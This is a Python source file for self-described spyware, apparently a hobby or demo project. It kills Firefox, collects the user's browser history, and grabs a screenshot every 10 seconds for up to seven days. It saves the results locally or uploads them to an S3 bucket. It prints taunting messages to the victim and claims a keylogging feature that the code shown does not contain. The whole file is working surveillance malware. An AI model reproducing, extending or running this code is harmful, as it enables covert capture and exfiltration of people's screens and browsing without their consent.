import sys
import argparse
import pyscreenshot as screenshot
import os
from datetime import timedelta, date, datetime
import utils
import time
from browserhistory import get_browserhistory
from browserhistory import browse
import json
from sys import platform
def inputBrowser():
	if platform == "linux" or platform == "darwin" or platform =="linux2":
		os.system('killall -KILL firefox')
	else:
		os.system('taskkill /F /IM firefox.exe')

	a=get_browserhistory()
	# # browse()
	# os.system('taskkill /F /IM firefox.exe')
	# os.system('killall -KILL firefox')
	print("We have your browser history HUAHUAHUA!")
	return a

def main(args):
	# Describes what is happening
    print("This spyware is takes a screeshot of the computer it is running on every 10 seconds.")
    print("There is also a keylogging feature keeping track of each key pressed.")
    print("It is probably taking screenshots of your screen right now as you are reading this. :)")
    duration = args.duration
    interval = args.interval
    output_dir = args.output_dir
    s3_bucket = args.s3_bucket

    if not os.path.isdir(output_dir):
        print('Output directory is not a directory.')
        return

    cur_date = datetime.now()
    end_date = timedelta(days=duration) + cur_date
    delta = timedelta(seconds=interval)

    # creates directories
    if s3_bucket == "":
        os.mkdir(output_dir+'/outputs')
        os.mkdir(output_dir + '/outputs/screenshots')
        browserhistDict = inputBrowser()
        file = open(output_dir + '/outputs/history.txt', 'w')
        file.write(json.dumps(browserhistDict))
        file.close()
    else:
        browserhistDict = inputBrowser()
        file = open(output_dir + '/history.txt', 'w')
        file.write(json.dumps(browserhistDict))
        utils.save_to_s3(output_dir + '/history.txt', "history")
        os.remove(output_dir + '/history.txt')
        file.close()

    while cur_date <= end_date:
        im = screenshot.grab()
        file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.png'
        fp = output_dir + '/outputs/screenshots' + '/' + file_name
        #save payloads to s3
        if s3_bucket != "":
            utils.save_to_s3(fp, file_name)
            os.remove(fp)

        else: #save all payloads (keylogger, history, output files) to output dir
            im.save(fp)

        time.sleep(int(interval))

        cur_date += delta

# Instruction panel
def inspanel():
    print("Enter 1 to run the program")
    print("Enter 2 to exit")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                                    description = "Screenshots and keylogs a host",
                                )
    parser.add_argument("-d", "--duration", type=int, default=7,
                      help = "The duration of the script in days")
    parser.add_argument("-i", "--interval", type=int, default=10,
                      help = "The interval of the screenshots in seconds")
    parser.add_argument("-o", "--output_dir", default=os.getcwd(),
                      help = "The output directory of the screenshots")
    parser.add_argument("-s3", "--s3_bucket", default="",
                      help = "The output directory of the screenshots")

    args = parser.parse_args()
    main(args)
